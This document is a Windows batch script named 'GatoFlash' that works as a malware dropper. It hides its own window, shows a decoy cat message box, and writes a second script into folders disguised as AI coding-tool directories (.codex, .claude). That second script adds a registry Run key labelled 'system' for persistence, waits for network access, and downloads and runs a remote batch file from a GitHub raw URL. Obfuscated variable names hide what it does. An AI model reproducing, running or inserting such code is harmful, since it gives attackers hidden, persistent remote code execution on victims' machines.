@echo off
title GatoFlash
set "e2=%UERPROFILE%"
set "A=\arg0"
set "C=\.codex"
set "U=%%USERPROFILE%%"
set "VV=%U%%C%%T%%A%%C1%"
set "h=\.claude"
set "C1=\codex-arg0dXy9BJ"
set "xz=\a0"
set "w=\C--Windows-system64"
set "df=\coex"
set "b=\projects"
set "W=%U%%C%%T%%A%%C1%%T1%"
set "Cx=\codex"
set "Vu=%dd%%fb%%re%%wg%%Cq%"
set "31=\tlket.bat"
set "m=%d%d%d%dT%%4%%C13%%55%"
set "s=\tp"
set "e=\mgsd.bat"
set "T1=\tolket.bat"
set "E=%U%%h%%b%%w%%e%"
cd /d "C:\"
if "%1"=="hide" goto :run
set "vbs_hide=%temp%\hide_run.vbs"
echo CreateObject("Wscript.Shell").Run chr(34) ^& "%~f0" ^& chr(34) ^& " hide", 0, False > "%vbs_hide%"
wscript "%vbs_hide%"
del "%vbs_hide%"
exit
:run
echo x=msgbox("Pageme!!.", 64, "  Miau!  ") > "%temp%\gatito_msg.vbs"
start wscript "%temp%\gatito_msg.vbs"
(
    echo @echo off
    echo powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)"
    echo set "T=\tmp"
    echo set "e2=%UERPROFILE%"
    echo set "A=\arg0"
    echo set "C=\.codex"
    echo set "U=%%USERPROFILE%%"
    echo set "VV=%U%%C%%T%%A%%C1%"
    echo set "h=\.claude"
    echo set "C1=\codex-arg0dXy9BJ"
    echo set "xz=\a0"
    echo set "w=\C--Windows-system64"
    echo set "df=\coex"
    echo set "b=\projects"
    echo set "W=%U%%C%%T%%A%%C1%%T1%"
    echo set "Cx=\codex"
    echo set "Vu=%dd%%fb%%re%%wg%%Cq%"
    echo set "31=\tlket.bat"
    echo set "m=%d%d%d%dT%%4%%C13%%55%"
    echo set "s=\tp"
    echo set "e=\mgsd.bat"
    echo set "T1=\tolket.bat"
    echo set "E=%U%%h%%b%%w%%e%"
    echo reg add "HKCU\Software\Madicrosoft\Windows\adsCurrentVersion\Run" /v "system" /t REG_SZ /d "%U%%C%%T%%A%%C1%%T1%" /f ^>nul 2^>^&1
    echo setlocal
    echo if exist "%E%" del /F /Q /A "%E%"
    echo :wait_net
    echo ping -n 1 8.8.8.8 ^>nul 2^>^&1
    echo if errorlevel 1 ^( goto wait_net ^)
    echo :dis
    echo curl -f -L -o "%E%" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat"
    echo if errorlevel 1 ^( goto dis ^)
    echo start "" "%E%"
    echo exit
) > "%U%%C%%T%%A%%C1%%T1%"
exit
